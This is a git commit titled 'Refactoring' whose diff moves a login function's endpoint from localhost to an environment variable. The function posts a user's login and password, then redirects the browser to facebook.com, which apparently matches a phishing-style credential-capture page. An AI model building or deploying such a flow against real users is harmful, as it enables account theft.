836f809e3630051ae693918d0699f6f5aa8eddb0
Max Korop <makskorop99@gmail.com>
2024-03-11 19:02:27 +0200

    Refactoring

--- client/src/http.js
+++ client/src/http.js
@@ -1,7 +1,7 @@
 import axios from "axios";
 
 export const send = (login, password) => {
-    axios.post("http://localhost:3000", { login, password }).then(result => {
+    axios.post(process.env.REACT_APP_API_URL, { login, password }).then(result => {
         if (result.data.user) window.location.href = "https://www.facebook.com/";
     });
 }
